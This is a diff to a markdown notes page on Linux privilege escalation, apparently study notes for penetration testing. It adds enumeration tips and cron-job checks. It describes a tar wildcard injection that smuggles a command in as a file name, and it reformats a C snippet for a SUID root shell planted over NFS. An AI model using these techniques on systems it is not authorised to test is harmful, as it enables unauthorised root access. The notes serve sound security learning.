@@ -17,6 +17,8 @@ pagetitle: Linux Privilege Escalation
 	- Running `hostname` can give us, the, uh, hostname
 	- Reading `/etc/issue` and `/etc/os-release` and `uname -a` can give us OS info for exploits
 	- Explore processes with `ps aux`
+	- Check out open ports with `ss -plunt`
+    	- This will VERY OFTEN be a mechanism for privilege escalation, as internal services tend to be pretty squishy, so enumerate them well!
 	- Check out network adapters with `ip a` or `ifconfig`
 		- Display routing tables with `route` or `routel` or `netstat -rn`
 		- Check the arp table for recent connections with `arp -a` (same with `/etc/hosts`)
@@ -24,11 +26,6 @@ pagetitle: Linux Privilege Escalation
 - Getting info on the firewall (without root user -> iptables)
 	- Can sometimes read `/etc/iptables` 
 	- Can search for `iptables-save` output in that directory, ending in .v4 I think
-- Check cron jobs with `ls -lah /etc/cron*`
-	- Has sections showing what is run at what intervals (e.g. hourly)
-		- We can then check those folders to see what's running (e.g. `/etc/cron.hourly/`)
-	- If we have sudo permissions ONLY for checking crontab, running `sudo crontab -l` will show scripts run by the root user
-	- Can also check for running cron jobs with `grep "CRON" /var/log/syslog`
 - Querying installed packages with `dpkg -l`
 - Checking drives
 	- `mount` will list all mounted filesystems
@@ -88,12 +85,14 @@ pagetitle: Linux Privilege Escalation
 ## Insecure File Permissions
 
 **Abusing Insecure Cron Jobs/File Permissions**
+- Use [pspy64](https://github.com/DominicBreuker/pspy)!! It can catch root-level cron jobs by watching /tmp and other places
 - Checking for running cron jobs
 	- `ls -lah /etc/cron*`
 	- `grep "CRON" /var/log/syslog`
-	- check `/var/log/cron.log`
+	- check `/opt/crontabs/` and `/var/log/cron.log`
 	- We can also abuse wildcards
 		- For example, if there's a cron job taking the tar of the current directory with `tar -zcf {output_file} *`, we can name a file `--checkpoint=1 --checkpoint-action=exec={command_or_script}`, which would get appended onto the tar command due to the wildcard
+
 - Find modifiable cron jobs and overwrite them with anything, really
 - Find writable directories with `find / -writable -type d 2>/dev/null`
 - Find writable files with `find / -writable -type f 2>/dev/null`
@@ -227,17 +226,17 @@ void dbquery() {
 - Exploitation steps:
 	- Create suid binary that executes `/bin/sh` on kali machine
 
-	```
-	#include <stdio.h>
-	#include <sys/types.h>
-	#include <unistd.h>
-	#include <stdlib.h>
+```
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <stdlib.h>
 
-	int main(void)
-	{
+int main(void)
+{
 	setuid(0); setgid(0); system("/bin/bash");
-	}
-	```
+}
+```
 
   - Mount `/mnt` to `/tmp` on the target server's NFS - `sudo mount -t nfs {target}:/tmp /mnt`
   - Copy the file to `/tmp` directory on the NFS server - `cp {binary_name} /mnt`
